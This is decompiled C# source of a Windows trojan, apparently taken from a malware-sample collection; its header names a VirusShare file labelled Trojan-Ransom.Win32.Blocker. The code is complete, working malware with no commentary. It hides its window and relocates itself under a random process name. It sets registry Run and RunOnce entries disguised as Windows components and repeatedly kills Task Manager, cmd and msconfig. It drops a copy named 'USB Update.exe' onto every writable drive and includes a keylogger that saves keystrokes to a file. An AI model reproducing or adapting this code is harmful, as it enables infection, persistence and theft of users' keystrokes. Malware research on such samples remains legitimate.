// Decompiled with JetBrains decompiler
// Type: needlehit.Form1
// Assembly: needlehit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E8030438-E71A-4D1D-893F-BA34E870279F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.ahou-60639f310154f27fe3aca1049bbcb3fc1e514e0c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using needlehit.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace needlehit
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;
    private Random rnd;
    private List<string> st;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.rnd = new Random();
      this.st = new List<string>();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Timer1 = new Timer(this.components);
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(256, 154);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    internal virtual Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.Visible = false;
      this.st.Add("t#a#s#k#m#g#r".Replace("#", ""));
      this.st.Add("c#m#d".Replace("#", ""));
      this.st.Add("m#s#c#o#n#f#i#g".Replace("#", ""));
      this.st.Add("S!o!f!t!w!a!r!e!\\!M!i!c!r!o!s!o!f!t!\\!W!i!n!d!o!w!s!\\!C!u!r!r!e!n!t!V!e!r!s!i!o!n!\\!R!u!n".Replace("!", ""));
      this.st.Add("S?o?f?t?w?a?r?e?\\?M?i?c?r?o?s?o?f?t?\\?W?i?n?d?o?w?s?\\?C?u?r?r?e?n?t?V?e?r?s?i?o?n?\\?R?u?n?O?n?ce".Replace("?", ""));
      this.st.Add("W>o>h>o>s>t> >W>i>n>d>o>w>s> >O>T>P> >H>o>s>t".Replace(">", ""));
      this.st.Add("A<g<e<b<o<o<t".Replace("<", ""));
      this.st.Add("7%4%9%3%6%4%9%8%2%3%6%4%9%4%5%6%0%9%3%4%6%5%9%4%4%0%5%3%4%.%t%x%t".Replace("%", ""));
      if (!MyProject.Computer.FileSystem.FileExists(Path.Combine(Application.StartupPath, this.st[7])))
      {
        if (!MyProject.Computer.FileSystem.FileExists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys")))
        {
          MyProject.Computer.FileSystem.MoveFile(Application.ExecutablePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.exe"));
          MyProject.Computer.FileSystem.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "#Processname+-0-0-0-#DECRIPTFISH+" + this.GEN(), false);
          this.save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH", this.GEN());
          this.CN();
          this.Aut();
          this.Close();
        }
        if (Operators.CompareString(this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH"), Interaction.Command(), false) == 0)
          this.save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH", this.GEN());
        this.CN();
        this.Aut();
        List<string> usbDriver = this.Get_USB_Driver();
        int num = checked (usbDriver.Count - 1);
        int index = 0;
        while (index <= num)
        {
          if (!File.Exists(Path.Combine(usbDriver[index], "USB Update.exe")))
            File.WriteAllBytes(Path.Combine(usbDriver[index], "USB Update.exe"), needlehit.My.Resources.Resources.Droper_Needlehit_a);
          checked { ++index; }
        }
      }
      else
        this.Close();
    }

    public string GEN()
    {
      string str = "";
      int num = 0;
      do
      {
        char[] charArrayRankOne = Conversions.ToCharArrayRankOne("QWERTZUIOPASDFGHJKLYXCVBNM12345567890");
        str += Conversions.ToString(charArrayRankOne[this.rnd.Next(0, checked (charArrayRankOne.Length - 1))]);
        checked { ++num; }
      }
      while (num <= 30);
      return str;
    }

    public void Aut()
    {
      string path2 = this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname");
      string str = this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH");
      RegistryKey subKey1 = MyProject.Computer.Registry.CurrentUser.CreateSubKey(this.st[3]);
      subKey1.SetValue(this.st[5], (object) (Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path2) + " " + str));
      subKey1.Close();
      RegistryKey subKey2 = MyProject.Computer.Registry.CurrentUser.CreateSubKey(this.st[4]);
      subKey2.SetValue(this.st[6], (object) (Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path2) + " " + str));
      subKey2.Close();
    }

    public void CN()
    {
      Process[] processes = Process.GetProcesses();
      string processName;
      do
      {
        processName = processes[this.rnd.Next(0, 5)].ProcessName;
      }
      while (MyProject.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName + ".exe"));
      string str = this.read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname");
      if (Operators.CompareString(str, "-0-0-0-", false) == 0)
        str = "needlehit.exe";
      MyProject.Computer.FileSystem.RenameFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), str), processName + ".exe");
      this.save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname", processName + ".exe");
    }

    public void save_proporty(string file, string zelle, string data)
    {
      if (MyProject.Computer.FileSystem.FileExists(file))
      {
        string[] strArray1 = MyProject.Computer.FileSystem.ReadAllText(file).Split('#');
        int num1 = checked (strArray1.Length - 1);
        int index1 = 0;
        while (index1 <= num1)
        {
          string[] strArray2 = strArray1[index1].Split('+');
          if (Operators.CompareString(strArray2[0], zelle, false) == 0)
          {
            strArray1[index1] = strArray1[index1].Replace(strArray2[1], data);
            string text = "";
            int num2 = checked (strArray1.Length - 1);
            int index2 = 0;
            while (index2 <= num2)
            {
              text = text + strArray1[index2] + Interaction.IIf(index2 == checked (strArray1.Length - 1), (object) "", (object) "#").ToString();
              checked { ++index2; }
            }
            MyProject.Computer.FileSystem.WriteAllText(file, text, false);
            return;
          }
          checked { ++index1; }
        }
        MyProject.Computer.FileSystem.WriteAllText(file, "#" + zelle + "+" + data, true);
      }
      else
        MyProject.Computer.FileSystem.WriteAllText(file, "#" + zelle + "+" + data, true);
    }

    public string read_proporty(string file, string zelle)
    {
      string[] strArray1 = MyProject.Computer.FileSystem.ReadAllText(file).Split('#');
      int num = checked (strArray1.Length - 1);
      int index = 0;
      while (index <= num)
      {
        string[] strArray2 = strArray1[index].Split('+');
        if (Operators.CompareString(strArray2[0], zelle, false) == 0)
          return strArray2[1];
        checked { ++index; }
      }
      return "-0-0-0-";
    }

    public List<string> Get_USB_Driver()
    {
      List<string> usbDriver = new List<string>();
      DriveInfo[] drives = DriveInfo.GetDrives();
      int num = checked (drives.Length - 1);
      int index = 0;
      while (index <= num)
      {
        string fullName = drives[index].RootDirectory.FullName;
        bool flag = false;
        try
        {
          File.WriteAllText(fullName + "\\a.", "");
          flag = true;
          File.Delete(fullName + "\\a.");
          usbDriver.Add(fullName);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          flag = false;
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      return usbDriver;
    }

    public void KP(string st)
    {
      Process[] processesByName = Process.GetProcessesByName(st);
      int num = checked (processesByName.Length - 1);
      int index = 0;
      while (index <= num)
      {
        processesByName[index].Kill();
        checked { ++index; }
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.KP(this.st[0]);
      this.KP(this.st[1]);
      this.KP(this.st[2]);
    }

    public class Keylogger_
    {
      private static List<WeakReference> __ENCList = new List<WeakReference>();
      [AccessedThroughProperty("timer1_")]
      private Timer _timer1_;
      public string lol;
      public int time;
      public int counter;
      private string file;

      [DebuggerNonUserCode]
      static Keylogger_()
      {
      }

      public Keylogger_()
      {
        Form1.Keylogger_.__ENCAddToList((object) this);
        this.lol = "";
        this.time = 0;
        this.counter = 0;
      }

      [DebuggerNonUserCode]
      private static void __ENCAddToList(object value)
      {
        lock (Form1.Keylogger_.__ENCList)
        {
          if (Form1.Keylogger_.__ENCList.Count == Form1.Keylogger_.__ENCList.Capacity)
          {
            int index1 = 0;
            int num = checked (Form1.Keylogger_.__ENCList.Count - 1);
            int index2 = 0;
            while (index2 <= num)
            {
              if (Form1.Keylogger_.__ENCList[index2].IsAlive)
              {
                if (index2 != index1)
                  Form1.Keylogger_.__ENCList[index1] = Form1.Keylogger_.__ENCList[index2];
                checked { ++index1; }
              }
              checked { ++index2; }
            }
            Form1.Keylogger_.__ENCList.RemoveRange(index1, checked (Form1.Keylogger_.__ENCList.Count - index1));
            Form1.Keylogger_.__ENCList.Capacity = Form1.Keylogger_.__ENCList.Count;
          }
          Form1.Keylogger_.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
        }
      }

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern int GetAsyncKeyState(int vkey);

      public virtual Timer timer1_
      {
        [DebuggerNonUserCode] get => this._timer1_;
        [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
        {
          EventHandler eventHandler = new EventHandler(this.timer1_Tick);
          if (this._timer1_ != null)
            this._timer1_.Tick -= eventHandler;
          this._timer1_ = value;
          if (this._timer1_ == null)
            return;
          this._timer1_.Tick += eventHandler;
        }
      }

      public void start_()
      {
        this.file = Application.StartupPath + "\\*n*e*e*d*l*e*h*i*t*.*w*i*n*d*o*w*s*3*2*.*s*y*s".Replace("*", "");
        this.timer1_ = new Timer();
        this.timer1_.Interval = 50;
        this.timer1_.Start();
      }

      public void timer1_Tick(object sender, EventArgs e)
      {
        try
        {
          this.lol += this.g();
          if (this.counter == 10)
          {
            MyProject.Computer.FileSystem.WriteAllText(this.file, this.lol, true);
            this.lol = "";
            this.counter = 0;
          }
          else
            checked { ++this.counter; }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }

      public string g()
      {
        int num = 1;
        while (Form1.Keylogger_.GetAsyncKeyState(num) != -32767)
        {
          checked { ++num; }
          if (num > (int) byte.MaxValue)
            return "";
        }
        return this.get_keys(num);
      }

      public string get_keys(int @int)
      {
        switch (@int)
        {
          case 8:
            return "[Backspace]";
          case 9:
            return "[Tab]";
          case 13:
            return "[Enter]";
          case 16:
            return "[Shift]";
          case 17:
            return "[Strg]";
          case 18:
            return "[Alt]";
          case 20:
            return "[Umstell.]";
          case 32:
            return " ";
          case 33:
            return "!";
          case 34:
            return "´´";
          case 35:
            return "#";
          case 36:
            return "$";
          case 37:
            return "%";
          case 38:
            return "&";
          case 39:
            return "'";
          case 40:
            return "(";
          case 41:
            return ")";
          case 42:
            return "*";
          case 43:
            return "+";
          case 44:
            return ",";
          case 45:
            return "-";
          case 46:
            return ".";
          case 47:
            return "/";
          case 48:
            return "0";
          case 49:
            return "1";
          case 50:
            return "2";
          case 51:
            return "3";
          case 52:
            return "4";
          case 53:
            return "5";
          case 54:
            return "6";
          case 55:
            return "7";
          case 56:
            return "8";
          case 57:
            return "9";
          case 58:
            return ":";
          case 59:
            return ";";
          case 60:
            return "<";
          case 61:
            return "=";
          case 62:
            return ">";
          case 63:
            return "?";
          case 64:
            return "@";
          case 65:
            return "a";
          case 66:
            return "b";
          case 67:
            return "c";
          case 68:
            return "d";
          case 69:
            return "e";
          case 70:
            return "f";
          case 71:
            return "g";
          case 72:
            return "h";
          case 73:
            return "i";
          case 74:
            return "j";
          case 75:
            return "k";
          case 76:
            return "l";
          case 77:
            return "m";
          case 78:
            return "n";
          case 79:
            return "o";
          case 80:
            return "p";
          case 81:
            return "q";
          case 82:
            return "r";
          case 83:
            return "s";
          case 84:
            return "t";
          case 85:
            return "u";
          case 86:
            return "v";
          case 87:
            return "w";
          case 88:
            return "x";
          case 89:
            return "y";
          case 90:
            return "z";
          case 91:
            return "[Win]";
          case 92:
            return "[Win]";
          case 93:
            return "]";
          case 94:
            return "^";
          case 95:
            return "_";
          case 96:
            return "`";
          case 97:
            return "a";
          case 98:
            return "b";
          case 99:
            return "c";
          case 100:
            return "d";
          case 101:
            return "e";
          case 102:
            return "f";
          case 103:
            return "g";
          case 104:
            return "h";
          case 105:
            return "i";
          case 106:
            return "j";
          case 107:
            return "k";
          case 108:
            return "l";
          case 109:
            return "m";
          case 110:
            return "n";
          case 111:
            return "o";
          case 112:
            return "[F1]";
          case 113:
            return "[F2]";
          case 114:
            return "[F3]";
          case 115:
            return "[F4]";
          case 116:
            return "[F5]";
          case 117:
            return "[F6]";
          case 118:
            return "[F7]";
          case 119:
            return "[F8]";
          case 120:
            return "[F9]";
          case 121:
            return "[F10]";
          case 122:
            return "[F11]";
          case 123:
            return "[F12]";
          case 124:
            return "|";
          case 125:
            return "}";
          case 126:
            return "~";
          case 128:
            return "€";
          case 130:
            return "‚";
          case 131:
            return "ƒ";
          case 132:
            return "„";
          case 133:
            return "…";
          case 134:
            return "†";
          case 135:
            return "‡";
          case 136:
            return "ˆ";
          case 138:
            return "Š";
          case 139:
            return "‹";
          case 142:
            return "Ž";
          case 145:
            return "‘";
          case 146:
            return "’";
          case 147:
            return "\"";
          case 148:
            return "\"";
          case 149:
            return "•";
          case 150:
            return "–";
          case 151:
            return "—";
          case 152:
            return "˜";
          case 153:
            return "™";
          case 154:
            return "š";
          case 155:
            return "›";
          case 158:
            return "ž";
          case 159:
            return "Ÿ";
          case 160:
            return "";
          case 161:
            return "";
          case 162:
            return "";
          case 163:
            return "";
          case 164:
            return "[Alt]";
          case 165:
            return "[Alt]";
          case 166:
            return "¦";
          case 167:
            return "§";
          case 168:
            return "¨";
          case 169:
            return "©";
          case 170:
            return "ª";
          case 171:
            return "«";
          case 172:
            return "¬";
          case 174:
            return "®";
          case 175:
            return "¯";
          case 176:
            return "°";
          case 177:
            return "±";
          case 178:
            return "\u00B2";
          case 179:
            return "\u00B3";
          case 180:
            return "´";
          case 181:
            return "µ";
          case 183:
            return ".";
          case 184:
            return "¸";
          case 185:
            return "\u00B9";
          case 186:
            return "ü";
          case 187:
            return "+";
          case 188:
            return ",";
          case 189:
            return "-";
          case 190:
            return ".";
          case 191:
            return "¿";
          case 192:
            return "ö";
          case 193:
            return "Á";
          case 194:
            return "Â";
          case 195:
            return "Ã";
          case 196:
            return "Ä";
          case 197:
            return "Æ";
          case 198:
            return "Ç";
          case 199:
            return "È";
          case 200:
            return "É";
          case 201:
            return "Ê";
          case 202:
            return "Ë";
          case 203:
            return "Ì";
          case 204:
            return "Í";
          case 205:
            return "Í";
          case 206:
            return "Î";
          case 207:
            return "Ï";
          case 208:
            return "Ð";
          case 209:
            return "Ñ";
          case 210:
            return "Ò";
          case 211:
            return "Ó";
          case 212:
            return "Ô";
          case 213:
            return "Õ";
          case 214:
            return "Ö";
          case 215:
            return "×";
          case 216:
            return "Ø";
          case 217:
            return "Ù";
          case 218:
            return "Ú";
          case 219:
            return "Û";
          case 220:
            return "Ü";
          case 221:
            return "Ý";
          case 222:
            return "ä";
          case 223:
            return "ß";
          case 224:
            return "à";
          case 225:
            return "á";
          case 226:
            return "â";
          case 227:
            return "<";
          case 228:
            return "ä";
          case 229:
            return "æ";
          case 230:
            return "ç";
          case 231:
            return "è";
          case 232:
            return "é";
          case 233:
            return "ê";
          case 234:
            return "ë";
          case 235:
            return "ì";
          case 236:
            return "í";
          case 237:
            return "í";
          case 238:
            return "î";
          case 239:
            return "ï";
          case 240:
            return "ð";
          case 241:
            return "ñ";
          case 242:
            return "ò";
          case 243:
            return "ó";
          case 244:
            return "ô";
          case 245:
            return "õ";
          case 246:
            return "ö";
          case 247:
            return "÷";
          case 248:
            return "ø";
          case 249:
            return "ù";
          case 250:
            return "ú";
          case 251:
            return "û";
          case 252:
            return "ü";
          case 253:
            return "ý";
          case 254:
            return "þ";
          case (int) byte.MaxValue:
            return "ÿ";
          default:
            return "";
        }
      }
    }
  }
}
